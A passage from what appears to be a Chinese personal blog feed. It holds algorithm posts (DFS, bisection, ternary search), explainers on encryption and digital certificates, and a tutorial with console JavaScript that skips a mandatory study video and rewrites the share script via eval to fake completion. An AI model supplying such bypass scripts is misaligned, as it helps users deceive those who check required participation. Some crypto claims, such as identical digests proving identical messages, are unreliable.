class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"><span class="keyword">int</span> na,nb,nc;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">25</span>][<span class="number">25</span>][<span class="number">25</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(visited[a][b][c]) <span class="keyword">return</span>;</span><br><span class="line">    visited[a][b][c] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!a) s.insert(c);</span><br><span class="line">    <span class="keyword">if</span>(a &lt;= nb-b) dfs(<span class="number">0</span>,a+b,c);</span><br><span class="line">    <span class="keyword">else</span> dfs(a-nb+b,nb,c);</span><br><span class="line">    <span class="keyword">if</span>(b &lt;= na-a) dfs(a+b,<span class="number">0</span>,c);</span><br><span class="line">    <span class="keyword">else</span> dfs(na,a-na+b,c);</span><br><span class="line">    <span class="keyword">if</span>(a &lt;= nc-c) dfs(<span class="number">0</span>,b,a+c);</span><br><span class="line">    <span class="keyword">else</span> dfs(a-nc+c,b,nc);</span><br><span class="line">    <span class="keyword">if</span>(c &lt;= na-a) dfs(a+c,b,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span> dfs(na,b,c-na+a);</span><br><span class="line">    <span class="keyword">if</span>(b &lt;= nc-c) dfs(a,<span class="number">0</span>,b+c);</span><br><span class="line">    <span class="keyword">else</span> dfs(a,b-nc+c,nc);</span><br><span class="line">    <span class="keyword">if</span>(c &lt;= nb-b) dfs(a,b+c,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span> dfs(a,nb,c-nb+b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;na,&amp;nb,&amp;nc))</span><br><span class="line">    &#123;</span><br><span class="line">        s.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,nc);</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it = s.<span class="built_in">begin</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,*it);</span><br><span class="line">        it++;</span><br><span class="line">        <span class="keyword">for</span>(; it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" %d"</span>,*it);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速跳过青年大学习</title>
      <link href="/2020/09/12/qingniandaxuexi/"/>
      <url>/2020/09/12/qingniandaxuexi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本教程适用于安卓手机</p></blockquote><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>既然要优雅地完成大学习，首先得让微信给我们一个输入自己的代码的机会</p><p>按照如下步骤可以打开微信的开发工具</p><p>微信浏览器网页打开<a href="http://debugx5.qq.com/" target="_blank" rel="noopener">http://debugx5.qq.com</a>打开下面两项，就可以调试了</p><p>可以将这个网址发给一个好友，就能够在微信里面打开了</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/69a57370ebf47880.png" alt="img"></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>打开青年大学习，进入视频播放页面，会发现右下角出现一个绿色的<code>vConsole</code>图标，点击它会出现如下界面。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/1601ffe829599111.jpg" alt="img"></p><p>输入以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.section3'</span>).addClass(<span class="string">'topindex1'</span>);</span><br><span class="line">$(<span class="string">'.section4,#Cvideo'</span>).hide();</span><br></pre></td></tr></table></figure><p>点击ok即可快速跳过</p><h2 id="微信朋友圈分享"><a href="#微信朋友圈分享" class="headerlink" title="微信朋友圈分享"></a>微信朋友圈分享</h2><p>使用上面的代码快速完成大学习后，使用微信分享仍然是未完成状态</p><p>查阅资料后得知导致这一问题的原因是腾讯分享的sdk标题是网站自定义的，只好通过下面的代码来重新配置腾讯分享sdk来达到正常效果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> title = <span class="built_in">document</span>.title;</span><br><span class="line"><span class="keyword">var</span> newtitle = title.slice(<span class="number">0</span>, <span class="number">7</span>) + <span class="string">"网上主题团课"</span> + title.slice(<span class="number">7</span>);</span><br><span class="line">$(<span class="string">"script"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line">     <span class="keyword">var</span> content = $(<span class="keyword">this</span>).text();</span><br><span class="line">     <span class="keyword">if</span> (content.indexOf(title)!=<span class="number">-1</span>) &#123;</span><br><span class="line">         <span class="keyword">var</span> script = content.replace(title,<span class="string">"满分！我完成了"</span>+newtitle+<span class="string">"，你也来试试吧"</span>);</span><br><span class="line">         <span class="built_in">eval</span>(script);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>方案比较暴力，因为对应的dom元素没有id，只好查找替换了</p><p>效果</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/127e7fc7ba0826b9.png" alt="img"></p><h2 id="但是为什么是这样的"><a href="#但是为什么是这样的" class="headerlink" title="但是为什么是这样的"></a>但是为什么是这样的</h2><p>要搞清楚为什么是这样的，那就得使用调试工具对源代码一探究竟了</p><p>使用usb线将手机连接到电脑，打开手机的usb调试功能，并对电脑链接进行授权</p><p>（这里可能有人想问为啥不使用桌面版chrome的开发者工具直接调试网站，博主刚开始尝试使用桌面版chrome加载该网站时无论使用任何办法都无法将其切换到移动版的学习界面，可能是本人技术不够吧）</p><p>授权在微信内复制学习页面的链接，使用移动版chrome进入到开始学习页面，使用桌面版chrome打开<code>chrome://inspect/#devices</code></p><p>稍等片刻后就可以显示出chrome打开的网站</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/b215e0b8e5944cb5.png" alt="img"></p><p>点击<code>inspect</code>即可开始调试该网页</p><p>在某个script标签内找到了如下代码<br><img src="https://aotle.oss-cn-beijing.aliyuncs.com/d1f34d822ab5456c.png" alt="img"></p><p>既然视频结束后肯定要暂停视频并且显示某个页面，那么就把代码粘贴到console试试</p><p>成功!</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对称加密和非对称加密</title>
      <link href="/2020/09/10/jiami1/"/>
      <url>/2020/09/10/jiami1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>介绍了对称加密和非对称加密</p></blockquote><a id="more"></a><h2 id="对称加密（Symmetric-Cryptography），又称私钥加密"><a href="#对称加密（Symmetric-Cryptography），又称私钥加密" class="headerlink" title="对称加密（Symmetric Cryptography），又称私钥加密"></a>对称加密（Symmetric Cryptography），又称私钥加密</h2><p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）,这种方法在密码学中叫做对称加密算法。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。对称加密通常使用的是相对较小的密钥，一般小于256 bit。因为密钥越大，加密越强，但加密与解密的过程越慢。如果你只用1 bit来做这个密钥，那黑客们可以先试着用0来解密，不行的话就再用1解；但如果你的密钥有1 MB大，黑客们可能永远也无法破解，但加密和解密的过程要花费很长的时间。密钥的大小既要照顾到安全性，也要照顾到效率，是一个trade-off。</p><h2 id="非对称加密（Asymmetric-Cryptography），又称公钥加密"><a href="#非对称加密（Asymmetric-Cryptography），又称公钥加密" class="headerlink" title="非对称加密（Asymmetric Cryptography），又称公钥加密"></a>非对称加密（Asymmetric Cryptography），又称公钥加密</h2><p>1976年，美国学者Dime和Henman为解决信息公开传送和密钥管理问题，提出一种新的密钥交换协议，允许在不安全的媒体上的通讯双方交换信息，安全地达成一致的密钥，这就是“公开密钥系统”。相对于“对称加密算法”这种方法也叫做“非对称加密算法”。非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥（public key）和私钥（private key）。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。比如，你向银行请求公钥，银行将公钥发给你，你使用公钥对消息加密，那么只有私钥的持有人–银行才能对你的消息解密。与对称加密不同的是，银行不需要将私钥通过网络发送出去，因此安全性大大提高。</p><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>对称密钥加密我们从定义中应该就可以明白，它是信息的发送方和接收方都用同一个秘钥去加密和解密数据。这样做它的最大优势是加/解密速度快，适合于对大数据量进行密，但密钥管理困难，密钥在网络传输的过程种容易被窃取。</p><p>非对称密钥加密，它需要使用“一对”密钥来分别完成加密和解密操作，一个公开发布，即公开密钥，另一个由用户自己秘密保存，即私用密钥。信息发送者用公开密钥去加密，而信息接收者则用私用密钥去解密。公钥机制灵活，但加密和解密速度却比对称密钥加密慢得多。<br>非对称密钥加密的使用过程：</p><ol><li>A要向B发送信息，A和B都要产生一对用于加密和解密的公钥和私钥。</li><li>A的私钥保密，A的公钥告诉B；B的私钥保密，B的公钥告诉A。</li><li>A要给B发送信息时，A用B的公钥加密信息，因为A知道B的公钥。</li><li>A将这个消息发给B（已经用B的公钥加密消息）。</li><li>B收到这个消息后，B用自己的私钥解密A的消息，其他所有收到这个报文的人都无法解密，因为只有B才有B的私钥。</li><li>反过来，B向A发送消息也是一样。</li></ol><p>从上面大家应该可以看出对称加密和非对称加密的区别，下面稍微进行一下总结：</p><p>（1） 对称加密加密与解密使用的是同样的密钥，所以速度快，但由于需要将密钥在网络传输，所以安全性不高。<br>（2） 非对称加密使用了一对密钥，公钥与私钥，所以安全性高，但加密与解密速度慢。<br><strong>（3） 解决的办法是混合加密——将对称加密的密钥使用非对称加密的公钥进行加密，然后发送出去，接收方使用私钥进行解密得到对称加密的密钥，然后双方可以使用对称加密来进行沟通。</strong></p><p>混合加密是目前在通信方面最安全的做法。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字签名和数字证书</title>
      <link href="/2020/09/10/shuziqianming1/"/>
      <url>/2020/09/10/shuziqianming1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>介绍了数字签名和数字证书</p></blockquote><a id="more"></a><h2 id="散列函数和消息摘要"><a href="#散列函数和消息摘要" class="headerlink" title="散列函数和消息摘要"></a>散列函数和消息摘要</h2><p>一段信息，经过摘要算法(散列函数)得到一串哈希值，就是摘要(dijest)。</p><p>信息是任意长度，而摘要是定长。</p><p>摘要算法有MD5、SHA1、SHA256、SHA512等，算法把无限的映射成有限，因此可能会有碰撞（两个不同的信息，算出的摘要相同）</p><p>摘要不同于加密算法，因为不存在解密，只不过从摘要反推原信息很难（可以认为能加密但无法解密还原，但可以用于比对）。类比到人的话：时间一直向前走 ，我没有办法从现在的你身上反观到你过去的样子，也没法从现在的他身上反观到他过去的样子……但你们现在的样子依然有作用，那就是在于“是否相同”：我可以通过比对现在的你和现在的他是否相同，来判断过去的你和他是否相同，而无需知道过去的你和过去的他具体是什么样子。</p><p>摘要相同，信息一定相同。<strong>如果两张图片的md5相同，说明图片完全一样。</strong></p><p>一个安全的摘要算法需要满足：</p><blockquote><p> 1、输入长度是任意的，输出是固定的<br> 2、对每一个给定的输入,计算输出是很容易的<br> 3、给定H,找到两个不同的输入，输出同一个值在计算上不可行<br> 4、给定H和一个消息x,找到另一个不同的消息y，使它们散列到同一个值在计算上不可行<br> 常见的散列算法：MD2、MD4、MD5、SHA、SHA-1</p></blockquote><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是指发送方以电子形式签名一个消息或文件，签名后的消息或文件能在网络中传输，并表示签名人对该消息或文件的内容负有责任。数字签名综合使用了消息摘要和非对称加密技术，可以保证接受者能够核实发送者对报文的签名，发送者事后不抵赖报文的签名，接受者不能篡改报文内容和伪造对报文的签名。</p><h3 id="数字签名需要做到两点："><a href="#数字签名需要做到两点：" class="headerlink" title="数字签名需要做到两点："></a>数字签名需要做到两点：</h3><blockquote><p> 1、确认信息是由签名者发送的；<br> 2、确认信息从签发到接受没有被修改过。</p></blockquote><h3 id="数字签名的过程与示意图："><a href="#数字签名的过程与示意图：" class="headerlink" title="数字签名的过程与示意图："></a>数字签名的过程与示意图：</h3><blockquote><p> 1、发送方要发送消息运用散列函数（MD5、SHA-1等）形成消息摘要；<br> 2、发送方用<strong>自己的私钥</strong>对消息摘要进行加密，形成数字签名；<br> 3、发送方将数字签名附加在消息后发送给接收方；<br> 4、接受方用发送方的公钥对签名信息进行解密，得到消息摘要；<br> 5、接收方以相同的散列函数对接收到的消息进行散列，也得到一份消息摘要；<br> 6、接收方比较两个消息摘要，如果完全一致，说明数据没有被篡改，签名真实有效；否则拒绝该签名。</p></blockquote><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/ceb3477bdfe2dee4.png" alt="img"></p><p>如果通信的内容是加密的，就需要采用<strong>数字信封</strong>：发送方用对称密钥加密明文，然后用对方的公钥加密对称密钥发送给对方，对方收到电子信封，用自己的私钥解密，得到对称密钥解密，还原明文。此时数字签名的过程如下：</p><blockquote><p> 1、发送方要发送消息运用散列函数（MD5、SHA-1等）形成消息摘要；<br> 2、发送方用<strong>自己的私钥</strong>对消息摘要进行加密，形成数字签名；<br> 3、发送方用对称加密算法对消息原文、数字签名进行加密，得到密文信息；<br> 4、发送方用<strong>接收方的公钥</strong>加密对称加密算法的密钥进行加密，形成数字信封；<br> 5、发送方将3中的密文信息和数字信封一起发给接收方；<br> 6、接收方首先用自己的私钥解密数字信封，还原对称加密算法的密钥；<br> 7、接受方用6中的密钥解密接收到的密文，得到原文信息和数字签名；<br> 8、接受方用发送方的公钥对签名信息进行解密，得到消息摘要；<br> 9、接收方以相同的散列函数对接收到的消息进行散列，也得到一份消息摘要；<br> 10、接收方比较两个消息摘要，如果完全一致，说明数据没有被篡改，签名真实有效；否则拒绝该签名。</p></blockquote><h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字签名中“公钥”可能被攻击者替换，为了保证“公钥”是可信的，数字证书应运而生。</p><p>数字证书是一种权威的电子文档，由权威公正的第三方认证机构（CA）签发，广泛用于涉及需要身份认证和数据安全的领域。</p><p>注意这里有两个不同的非对称算法（对应2个公钥私钥对），一个算法是发送方加密摘要的，用于生成数字签名；另一个算法是CA加密发送方公钥的，用于生成数字证书。两个算法相互独立，没有必然联系。</p><p>发送时不仅发送内容、数字签名，还包含发送方的数字证书。接收方拿到后，首先从数字证书中解密出发送方公钥（用的是CA的公钥和CA解密算法），这个公钥必然是可信的。然后就是和前面一样的流程，拿发送方公钥去解密数字证书，得到摘要；最后比对摘要是否一致。</p><p>CA是第三方权威机构，CA公钥是公开的，因此不可能伪造。</p><h3 id="example-https"><a href="#example-https" class="headerlink" title="@example : https"></a>@example : https</h3><blockquote><p>工作流程，基本分为三个阶段：<br>1、认证服务器。浏览器内置一个受信任的CA机构列表，并保存了这些CA机构的证书。第一阶段服务器会提供经CA机构认证颁发的服务器证书，如果签发该证书的CA，存在于浏览器的受信任CA列表中（也就是签发该证书的CA的根证书，能够与客户端中保存的CA根证书比对上），说明这个CA是可信任的，可以保证证书不假。然后，再进一步判断服务器证书中的信息与当前正在访问的网站（域名等）一致，那么浏览器就认为服务端是可信的，并从服务器证书中取得服务器公钥，用于后续流程。否则，浏览器将提示用户，根据用户的选择，决定是否继续。 <strong>客户端是否能够信任这个站点的证书，首先取决于客户端程序是否导入了证书颁发者的根证书。</strong></p><p>2、协商会话密钥。客户端在认证完服务器，获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，在数据传输过程中，使用对称加密，可以节省计算资源。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。</p><p>3、加密通讯。此时客户端服务器双方都有了本次通讯的会话密钥，之后传输的所有Http数据，都通过会话密钥加密。这样网路上的其它用户，将很难窃取和篡改客户端和服务端之间传输的数据，从而保证了数据的私密性和完整性。</p></blockquote><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/eedf52aad41f9fe7.jpg" alt="img"></p><p>IE浏览器在验证证书的时候主要从下面三个方面考察，只要有任何一个不满足都将给出警告</p><ol><li>证书的颁发者是否在“根受信任的证书颁发机构列表”中</li><li>证书是否过期</li><li>证书的持有者是否和访问的网站一致</li></ol><h3 id="数字证书种类："><a href="#数字证书种类：" class="headerlink" title="数字证书种类："></a>数字证书种类：</h3><blockquote><p>1、服务器证书：证明服务器的身份和进行通信加密，客户端可以与服务器端建立SSL连接，然后通信数据都会被加密。<br> 2、电子邮件证书：证明电子邮件发件人的真实性，也可发送加密邮件，只有接收方才能打得开。<br> 3、客户端证书：主要用于身份验证和数字签名，安全的客户端证书经常存储的专门的USBKey中，使用的时候需要输入保护密码，以防被导出和复制，如指纹识别、语音播报、带显示器的USBKey等等。</p></blockquote><h3 id="数字证书功能："><a href="#数字证书功能：" class="headerlink" title="数字证书功能："></a>数字证书功能：</h3><p> 1、信息保密<br> 2、身份确认<br> 3、不可否认性<br> 4、数据完整性</p><h3 id="数字证书的格式："><a href="#数字证书的格式：" class="headerlink" title="数字证书的格式："></a>数字证书的格式：</h3><p> 最简单的可以是：公钥、名称和证书授权中心的数字签名，目前 <strong>X.509</strong> 是一种通用的证书格式，它的第三个版本目前使用广泛，证书内容包括：版本、序列号、签名算法标识、签发者、有效期、主体、主体公开密钥、CA的数字签名、可选型等等</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/9068a2df21919163.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分与三分</title>
      <link href="/2020/09/10/erfenchazhao2/"/>
      <url>/2020/09/10/erfenchazhao2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇用二分和三分求方程的根的博客</p></blockquote><a id="more"></a><h2 id="二分法求方程的根"><a href="#二分法求方程的根" class="headerlink" title="二分法求方程的根"></a>二分法求方程的根</h2><p>如果有函数发<code>f(x)</code>，它在区间[a, b]上递增或者递减，并且<code>f(a)*f(b)&lt;0</code>。那么我们知道函数必然有一个等于0的解，而且这个解我们可以用二分法来求近似解。</p><p>然后通过二分法缩小范围，直到区间长度足够小，这时候就说明找到了一个误差不超过区间长度的近似解。</p><p>在二分法当中，我们没进行一次二分迭代，区间的长度就会缩减一半，这是一个指数级的缩减。所以即使一开始的区间很大，经过二分迭代也可以迅速缩减，得到一个非常精准的结果，并且和泰勒级数一样，除了能得到一个足够精确的值之外，还能得到误差的范围。（注：函数可以不是严格单调的，二分法只需要满足<code>f(a)*f(b)&lt;0</code>，函数连续并且只有一个零点）。</p><h3 id="example"><a href="#example" class="headerlink" title="@example"></a>@example</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用二分法求f(x)&#x3D;x*x*x-7.7*x*x+19.2*x-15.3在区间[1,2]之间的根．</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-6</span>; <span class="comment">//定义我们计算的精度</span></span><br><span class="line"><span class="keyword">double</span> a,b,c,d;        <span class="comment">//假定我们输入的函数是一元三次方程组，a*x*x*x+b*x*x+c*x+d=0</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span> x)</span> <span class="comment">//定义我们的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*x*x*x+b*x*x+c*x+d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> m,n;<span class="comment">//求根区间[m,n]</span></span><br><span class="line">    <span class="keyword">double</span> i,j,sum;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入一元三次方程组的系数：a,b,c,d:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf%lf%lf"</span>,&amp;a,&amp;b,&amp;c,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n请输入求根区间[m,n]:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">if</span>(f(m)*f(n)&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fabs</span>(m-n)&gt;eps)</span><br><span class="line">        &#123;</span><br><span class="line">          i=(m+n)/<span class="number">2.0</span>;</span><br><span class="line">          sum=f(i);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"[%lf  %lf]\n"</span>,m,n);</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">fabs</span>(sum)&lt;eps)</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//printf("\n该方程组的近似根为:x2*=%lf\n",i);</span></span><br><span class="line">            <span class="comment">//return 1;</span></span><br><span class="line">           &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(f(i)*f(m)&lt;<span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              n=i; <span class="comment">//修正区间，将[m,n]换成[m,i],这里的i是中点</span></span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(f(i)*f(n)&lt;<span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              m=i;<span class="comment">//修正区间，将[m,n]换成[i,n],这里的i是中点</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf  %lf"</span>,m,n);</span><br><span class="line">    j=(m+n)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n该方程组的近似根为:x*=%lf\n"</span>,j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三分查找"><a href="#三分查找" class="headerlink" title="三分查找"></a>三分查找</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>在二分查找的基础上，在右区间（或左区间）再进行一次二分，这样的查找算法称为三分查找，也就是三分法。</p><p>三分查找通常用来迅速确定最值。</p><p>二分查找所面向的搜索序列的要求是：具有单调性（不一定严格单调）；没有单调性的序列不是使用二分查找。与二分查找不同的是，三分法所面向的搜索序列的要求是：序列为一个凸性函数。通俗来讲，就是该序列必须有一个最大值（或最小值），在最大值（最小值）的左侧序列，必须满足不严格单调递增（递减），右侧序列必须满足不严格单调递减（递增）。如下图，表示一个有最大值的凸性函数：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/187f9d6871e2f01b.jpg" alt="img"></p><h3 id="2-算法思路"><a href="#2-算法思路" class="headerlink" title="2.算法思路"></a>2.算法思路</h3><p>（1）与二分法类似，先取整个区间的中间值<code>mid</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid = (left + right) / <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>（2）再取右侧区间的中间值<code>midmid</code>，从而把区间分为三个小区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midmid = (mid + right) / <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>（3）我们<code>mid</code>比<code>midmid</code>更靠近最值，我们就舍弃右区间，否则我们舍弃左区间？。</p><p>比较<code>mid</code>与<code>midmid</code>谁最靠近最值，只需要确定<code>mid</code>所在的函数值与<code>midmid</code>所在的函数值的大小。当最值为最大值时，<code>mid</code>与<code>midmid</code>中较大的那个自然更为靠近最值。最值为最小值时同理。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cal(mid) &gt; cal(midmid))</span><br><span class="line">    right = midmid;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    left = mid;</span><br></pre></td></tr></table></figure><p>（4）重复（1）（2）（3）直至找到最值。</p><p><strong>算法的正确性：</strong></p><p>1、<code>mid</code>与<code>midmid</code>在最值的同一侧。由于凸性函数在最大值（最小值）任意一侧都具有单调性，因此，<code>mid</code>与<code>midmid</code>中，更大（小）的那个数自然更为靠近最值。此时，我们远离最值的那个区间不可能包含最值，因此可以舍弃。</p><p>2、<code>mid</code>与<code>midmid</code>在最值的两侧。由于最值在中间的一个区间，因此我们舍弃一个区间后，并不会影响到最值。</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="@example"></a>@example</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td 